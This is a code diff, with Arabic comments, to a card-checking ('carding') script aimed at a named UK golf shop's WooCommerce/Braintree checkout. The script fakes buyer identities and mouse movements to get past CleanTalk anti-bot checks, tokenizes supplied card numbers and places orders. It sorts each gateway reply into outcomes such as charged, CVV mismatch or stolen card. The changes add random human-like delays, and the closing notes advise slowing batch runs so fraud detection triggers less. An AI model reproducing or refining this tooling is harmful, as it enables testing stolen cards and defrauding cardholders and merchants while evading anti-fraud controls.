@@ -1,4 +1,4 @@
-# ==================== gatet.py (النسخة النهائية مع الردود الجديدة والمتطورة) ====================
+# ==================== gatet.py (النسخة النهائية مع تحسينات السرعة والتأخير العشوائي) ====================
 
 import requests, json, re, random, sys, os, time, base64, uuid
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -28,7 +28,7 @@ def generate_pointer_data():
     pointer_data = []
     start_time = random.randint(30000, 60000)
     
-    for i in range(random.randint(3, 8)):
+    for i in range(random.randint(5, 12)):  # زيادة عدد حركات الماوس (5-12)
         x = random.randint(200, 700)
         y = random.randint(50, 400)
         timestamp = start_time + random.randint(1000, 5000) * i
@@ -70,10 +70,11 @@ def generate_valid_uk_data():
     
     uk_postcodes = ['SW1A1AA', 'M11AE', 'B11TT', 'LS11UR', 'G11XU', 'EH11QQ', 'CF101EP', 'NE11EE', 'L11JA', 'S12BJ']
     uk_cities = ['London', 'Manchester', 'Birmingham', 'Leeds', 'Glasgow', 'Edinburgh', 'Cardiff', 'Newcastle', 'Liverpool', 'Sheffield']
-    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456']
-    uk_addresses = ['10 Downing Street', '221B Baker Street', 'Buckingham Palace Road', 'Abbey Road', 'Oxford Street']
+    uk_phones = ['07712345678', '07890123456', '07987654321', '07412345678', '07567890123', '07789123456', '07891234567', '07912345678']
+    uk_addresses = ['10 Downing Street', '221B Baker Street', 'Buckingham Palace Road', 'Abbey Road', 'Oxford Street',
+                    'King Edward Street', 'Piccadilly Circus', 'Trafalgar Square', 'Covent Garden', 'Liverpool Street']
     
-    # ================ إيميلات من دومينات متعددة مش جيميل بس ================
+    # إيميلات من دومينات متعددة
     email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', 
                      '@protonmail.com', '@mail.com', '@gmx.com', '@yandex.com', '@zoho.com']
     email_domain = random.choice(email_domains)
@@ -81,7 +82,7 @@ def generate_valid_uk_data():
     return {
         'first_name': first,
         'last_name': last,
-        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
+        'email': f"{first.lower()}.{last.lower()}{random.randint(1,9999)}{email_domain}",
         'phone': random.choice(uk_phones),
         'address_1': random.choice(uk_addresses),
         'city': random.choice(uk_cities),
@@ -105,6 +106,9 @@ def ch(ccx):
     correlation_id = str(uuid.uuid4())[:24]
     r = requests.session()
     
+    # إضافة Request ID عشوائي
+    request_id = str(uuid.uuid4())
+    
     # ================ استخراج قيم CleanTalk من الموقع ================
     product_url = 'https://www.expressgolf.co.uk/product/bees-tees-short-medium-long/'
     
@@ -125,7 +129,11 @@ def ch(ccx):
     print(f"[+] CleanTalk - ct_checkjs: {ct_checkjs[:30]}...")
     print(f"[+] CleanTalk - pointer_data generated: {ct_pointer_data[:50]}...")
     
-    # ================ 1. ADD TO CART ================
+    # ================ 1. ADD TO CART (مع تأخير عشوائي قبل) ================
+    # تأخير عشوائي قبل البدء (محاكاة لتأخير بشري)
+    pre_delay = random.uniform(2, 5)
+    time.sleep(pre_delay)
+    
     variation = random.choice(['Long 83mm (15)', 'Medium 69mm (20)', 'Short 53mm (25)'])
     variation_id_map = {
         'Long 83mm (15)': '170451',
@@ -163,11 +171,13 @@ def ch(ccx):
     
     headers_add = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
-        'accept-language': 'en-US',
+        'accept-language': 'en-US,en;q=0.9',
         'origin': 'https://www.expressgolf.co.uk',
         'referer': f'{product_url}?attribute_size={variation.replace(" ", "+")}',
         'user-agent': user,
         'upgrade-insecure-requests': '1',
+        'accept-encoding': 'gzip, deflate, br',
+        'dnt': '1',
         'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -177,12 +187,16 @@ def ch(ccx):
     if response.status_code != 200:
         return f'ADD_TO_CART_FAILED'
     
+    # تأخير عشوائي بعد إضافة المنتج
+    time.sleep(random.uniform(1.5, 3.5))
+    
     # ================ 2. CHECKOUT PAGE ================
     headers_checkout = {
-        'Accept-Language': 'en-US',
+        'Accept-Language': 'en-US,en;q=0.9',
         'Referer': 'https://www.expressgolf.co.uk/basket/',
         'Upgrade-Insecure-Requests': '1',
         'User-Agent': user,
+        'dnt': '1',
         'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -191,6 +205,9 @@ def ch(ccx):
     response = r.get('https://www.expressgolf.co.uk/checkout/', headers=headers_checkout)
     if response.status_code != 200:
         return f'CHECKOUT_PAGE_FAILED'
+    
+    # تأخير عشوائي إضافي
+    time.sleep(random.uniform(1, 2.5))
     
     # ================ 3. EXTRACT TOKENS AND NONCES ================
     enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
@@ -212,6 +229,9 @@ def ch(ccx):
         return 'CHECKOUT_NONCE_NOT_FOUND'
     check = check.group(1)
     
+    # تأخير عشوائي
+    time.sleep(random.uniform(0.5, 1.5))
+    
     # ================ 4. UPDATE ORDER REVIEW ================
     billing_email = fake_data['email']
     billing_first = fake_data['first_name']
@@ -224,12 +244,13 @@ def ch(ccx):
     
     headers_update = {
         'accept': '*/*',
-        'accept-language': 'en-US',
+        'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'origin': 'https://www.expressgolf.co.uk',
         'referer': 'https://www.expressgolf.co.uk/checkout/',
         'user-agent': user,
         'x-requested-with': 'XMLHttpRequest',
+        'dnt': '1',
         'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -241,16 +262,20 @@ def ch(ccx):
     
     response = r.post('https://www.expressgolf.co.uk/', params=params_update, headers=headers_update, data=data_update)
     
+    # تأخير عشوائي
+    time.sleep(random.uniform(0.5, 1.5))
+    
     # ================ 5. TOKENIZE CREDIT CARD ================
     headers_token = {
         'accept': '*/*',
-        'accept-language': 'en-US',
+        'accept-language': 'en-US,en;q=0.9',
         'authorization': f'Bearer {au}',
         'braintree-version': '2018-05-10',
         'content-type': 'application/json',
         'origin': 'https://assets.braintreegateway.com',
         'referer': 'https://assets.braintreegateway.com/',
         'user-agent': user,
+        'dnt': '1',
         'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -287,6 +312,9 @@ def ch(ccx):
     except:
         return f'TOKENIZATION_FAILED'
     
+    # تأخير عشوائي
+    time.sleep(random.uniform(0.8, 1.8))
+    
     # ================ 6. FINAL CHECKOUT ================
     cookies_final = {
         'apbct_site_referer': '0',
@@ -306,12 +334,13 @@ def ch(ccx):
     
     headers_final = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US',
+        'accept-language': 'en-US,en;q=0.9',
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'origin': 'https://www.expressgolf.co.uk',
         'referer': 'https://www.expressgolf.co.uk/checkout/',
         'user-agent': user,
         'x-requested-with': 'XMLHttpRequest',
+        'dnt': '1',
         'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -323,7 +352,7 @@ def ch(ccx):
     
     response = r.post('https://www.expressgolf.co.uk/', params=params_final, headers=headers_final, data=data_final, cookies=cookies_final)
     
-    # ================ 7. PARSE RESULT (مع كل الردود الجديدة) ================
+    # ================ 7. PARSE RESULT ================
     try:
         result_data = json.loads(response.text)
         messages = result_data.get("messages", "")
@@ -342,127 +371,157 @@ def ch(ccx):
     
     # ================ ردود Braintree الكاملة والمفصلة ================
     
-    # ----- 1. النجاح -----
+    # 1. النجاح
     if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
+        # تأخير عشوائي بعد النجاح
+        time.sleep(random.uniform(1, 2))
         return 'CHARGED'
     
-    # ----- 2. رصيد غير كافٍ -----
+    # 2. رصيد غير كافٍ
     if 'insufficient funds' in search_text:
+        time.sleep(random.uniform(0.5, 1))
         return 'INSUFFICIENT FUNDS'
     
-    # ----- 3. CVV خطأ -----
+    # 3. CVV خطأ
     if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv verification failed' in search_text:
+        time.sleep(random.uniform(0.5, 1))
         return 'CVV MISMATCH'
     
-    # ----- 4. بطاقة منتهية -----
+    # 4. بطاقة منتهية
     if 'expired card' in search_text:
         return 'EXPIRED CARD'
     
-    # ----- 5. Do Not Honor -----
+    # 5. Do Not Honor
     if 'do not honor' in search_text:
         return 'DO NOT HONOR'
     
-    # ----- 6. Closed Card (بطاقة مقفولة) -----
+    # 6. Closed Card
     if 'closed card' in search_text:
         return 'CLOSED CARD'
     
-    # ----- 7. Call Issuer (اتصل بالبنك) -----
+    # 7. Call Issuer
     if 'call issuer' in search_text:
         return 'CALL ISSUER'
     
-    # ----- 8. Pick Up Card (استلم البطاقة) -----
+    # 8. Pick Up Card
     if 'pick up card' in search_text:
         return 'PICK UP CARD'
     
-    # ----- 9. 3D Secure مطلوب -----
+    # 9. 3D Secure
     if '3d secure' in search_text or 'three_d_secure' in search_text:
         return '3D SECURE REQUIRED'
     
-    # ----- 10. تجاوز الحد -----
+    # 10. Limit Exceeded
     if 'limit exceeded' in search_text:
         return 'LIMIT EXCEEDED'
     
-    # ----- 11. بطاقة مسروقة أو مفقودة -----
+    # 11. Lost/Stolen Card
     if 'lost or stolen' in search_text:
         return 'LOST/STOLEN CARD'
     
-    # ----- 12. عنوان غير مطابق (AVS) -----
+    # 12. Address Mismatch
     if 'address verification' in search_text or 'avs' in search_text:
         return 'ADDRESS MISMATCH'
     
-    # ----- 13. Processor Declined (البنك رفض) -----
+    # 13. Processor Declined
     if 'processor declined' in search_text:
         return 'PROCESSOR DECLINED'
     
-    # ----- 14. بطاقة غير صالحة -----
+    # 14. Invalid Card
     if 'invalid card' in search_text or 'invalid card number' in search_text:
         return 'INVALID CARD'
     
-    # ----- 15. No Account (لا يوجد حساب) -----
+    # 15. No Account
     if 'no account' in search_text or 'no_account' in search_text:
         return 'NO ACCOUNT'
     
-    # ----- 16. Card Not Activated (بطاقة غير مفعلة) -----
+    # 16. Card Not Activated
     if 'card not activated' in search_text or 'not activated' in search_text:
         return 'CARD NOT ACTIVATED'
     
-    # ----- 17. Cannot authorize at this time (policy) -----
+    # 17. Cannot authorize at this time (policy)
     if 'cannot authorize at this time' in search_text or 'cannot authorize' in search_text:
         return 'CANNOT AUTHORIZE (POLICY)'
     
-    # ----- 18. Credit card type is not accepted by this merchant -----
+    # 18. Card type not accepted
     if 'card type is not accepted' in search_text or 'card type not accepted' in search_text:
         return 'CARD TYPE NOT ACCEPTED'
     
-    # ----- 19. Issuer or cardholder has put a restriction on the card -----
+    # 19. Card restriction
     if 'restriction on the card' in search_text or 'issuer restriction' in search_text:
         return 'CARD RESTRICTION'
     
-    # ----- 20. CleanTalk suspect - Fraud أنواع منفصلة -----
+    # 20. CleanTalk suspect
     if 'cleantalk suspect' in search_text or 'cleantalk' in search_text:
         if 'fraud' in search_text or 'spam' in search_text:
             return 'CLEANTALK FRAUD SUSPECT'
         else:
             return 'CLEANTALK SUSPECT'
     
-    # ----- 21. Gateway reject fraud (منفصل عن الـ Fraud العادي) -----
+    # 21. Gateway rejected fraud
     if 'gateway rejected: fraud' in search_text or 'gateway reject fraud' in search_text:
         return 'GATEWAY REJECTED FRAUD'
     
-    # ----- 22. Risk Threshold -----
+    # 22. Risk Threshold
     if 'risk_threshold' in search_text or 'risk threshold' in search_text:
         return 'RISK THRESHOLD'
     
-    # ----- 23. Processor declined - fraud suspected (منفصل) -----
+    # 23. Processor declined - fraud suspected
     if 'processor declined - fraud suspected' in search_text:
         return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
     
-    # ----- 24. Call issuer. pick up card (منفصل) -----
+    # 24. Call issuer. pick up card
     if 'call issuer. pick up card' in search_text:
         return 'CALL ISSUER - PICK UP CARD'
     
-    # ----- 25. Email doesn't exist -----
+    # 25. Email doesn't exist
     if 'email does not exist' in search_text or 'email doesn\'t exist' in search_text:
         return 'EMAIL DOES NOT EXIST'
     
-    # ----- 26. Pickup card (صيغة مختصرة) -----
+    # 26. Pickup card
     if 'pickup card' in search_text:
         return 'PICKUP CARD'
     
-    # ----- 27. Fraud (عام) -----
+    # 27. Fraud (عام)
     if 'fraud' in search_text or 'suspected fraud' in search_text:
         return 'SUSPECTED FRAUD'
     
-    # ----- 28. Generic Decline -----
+    # 28. Generic Decline
     if 'declined' in search_text:
         return 'DECLINED'
     
-    # ----- 29. أي سبب تاني من الـ Reason -----
+    # 29. أي سبب تاني من الـ Reason
     if reason and len(reason) < 40:
         return reason.upper()
     
-    # ----- 30. نص الـ messages نفسه لو قصير -----
+    # 30. نص الـ messages نفسه لو قصير
     if clean_messages and len(clean_messages) < 60:
         return clean_messages.title()
     
     return 'DECLINED'
+
+
+# ==================== في main.py (تعديل وقت التأخير بين البطاقات في الكومبو) ====================
+'''
+
+في دالة menu_callback، ابحث عن sleep_time وغيرها إلى:
+
+sleep_time = random.uniform(35, 60)  # من 35 إلى 60 ثانية بين كل بطاقة
+
+وده عشان الكومبو ميكونش سريع جداً ويزيد نسبة الـ Fraud.
+
+'''
+
+
+# ==================== في main.py (تعديل أمر السينجل) ====================
+'''
+
+في دالة respond_to_braintree، بعد نهاية الفحص (آخر السطر) أضف:
+
+# تأخير عشوائي كبير للسينجل (محاكاة سلوك بشري)
+if random.random() < 0.7:  # 70% من المرات
+    final_delay = random.uniform(45, 120)  # 45 ثانية - دقيقتين
+    print(f"[*] Waiting {final_delay:.0f} seconds before next check...")
+    time.sleep(final_delay)
+
+'''
